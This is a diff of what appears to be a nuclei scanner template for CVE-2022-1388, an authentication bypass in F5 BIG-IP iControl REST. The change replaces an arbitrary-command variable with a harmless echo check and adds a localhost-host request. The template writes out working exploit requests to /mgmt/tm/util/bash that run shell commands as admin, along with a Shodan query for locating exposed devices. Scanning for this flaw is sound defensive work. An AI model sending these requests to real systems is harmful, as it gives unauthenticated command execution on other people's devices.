@@ -1,29 +1,30 @@
 id: CVE-2022-1388
+
 info:
-  name: F5 BIG-IP iControl REST Auth Bypass RCE | Command Parameter
-  author: Mrcl0wn
+  name: F5 BIG-IP iControl - REST Auth Bypass RCE
+  author: dwisiswant0,Ph33r
   severity: critical
-  description: "CVE-2022-1388 is an authentication bypass vulnerability in the REST \ncomponent of BIG-IP’s iControl API that was assigned a CVSSv3 \nscore of 9.8. The iControl REST API is used for the management and \nconfiguration of BIG-IP devices. CVE-2022-1388 could be exploited \nby an unauthenticated attacker with network access to the management \nport or self IP addresses of devices that use BIG-IP. Exploitation would \nallow the attacker to execute arbitrary system commands, create and \ndelete files and disable services.\n"
+  description: |
+    F5 BIG-IP 16.1.x versions prior to 16.1.2.2, 15.1.x versions prior to 15.1.5.1, 14.1.x versions prior to 14.1.4.6, 13.1.x versions prior to 13.1.5, and all 12.1.x and 11.6.x versions, may allow undisclosed requests to bypass iControl REST authentication.
   reference:
-    - https://github.com/alt3kx/CVE-2022-1388_PoC
+    - https://twitter.com/GossiTheDog/status/1523566937414193153
+    - https://www.horizon3.ai/f5-icontrol-rest-endpoint-authentication-bypass-technical-deep-dive/
     - https://support.f5.com/csp/article/K23605346
     - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1388
-    - https://github.com/dorkerdevil/CVE-2021-22986-Poc/blob/main/README.md
-    - https://github.com/horizon3ai/CVE-2022-1388/blob/main/CVE-2022-1388.py
-    - https://www.tenable.com/blog/cve-2022-1388-authentication-bypass-in-f5-big-ip
-    - https://github.com/numanturle/CVE-2022-1388/blob/main/bigip-icontrol-rest-rce.yaml
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
-    cvss-score: 9.80
+    cvss-score: 9.8
     cve-id: CVE-2022-1388
     cwe-id: CWE-306
   metadata:
     shodan-query: http.title:"BIG-IP&reg;-+Redirect" +"Server"
-    verified: true
-  tags: bigip,mirai,rce,cve,cve2022
+    verified: "true"
+  tags: f5,bigip,cve,cve2022,rce,mirai,cisa
+
 variables:
-  auth_var: "admin:"
-  cmd_var: "{{CMD}}"
+  auth: "admin:"
+  cmd: "echo CVE-2022-1388 | rev"
+
 requests:
   - raw:
       - |
@@ -31,27 +32,35 @@ requests:
         Host: {{Hostname}}
         Connection: keep-alive, X-F5-Auth-Token
         X-F5-Auth-Token: a
-        Authorization: Basic {{base64(auth_var)}}
+        Authorization: Basic {{base64(auth)}}
         Content-Type: application/json
 
         {
-          "command": "run",
-          "utilCmdArgs": "-c 'id;cmd_var'"
+             "command": "run",
+             "utilCmdArgs": "-c '{{cmd}}'"
         }
-    extractors:
-      - type: regex
-        part: body
-        name: result_command
-        group: 1
-        regex:
-          - "\"commandResult\":\"(.*)\""
+
+      - |
+        POST /mgmt/tm/util/bash HTTP/1.1
+        Host: localhost
+        Connection: keep-alive, X-F5-Auth-Token
+        X-F5-Auth-Token: a
+        Authorization: Basic {{base64(auth)}}
+        Content-Type: application/json
+
+        {
+             "command": "run",
+             "utilCmdArgs": "-c '{{cmd}}'"
+        }
+
+    stop-at-first-match: true
+    matchers-condition: and
     matchers:
       - type: word
+        part: body
         words:
           - "commandResult"
-          - "uid="
-          - "{{cmd_var}}"
-      - type: status
-        status:
-          - 200
+          - "8831-2202-EVC"
         condition: and
+
+# Enhanced by mp on 2022/05/19
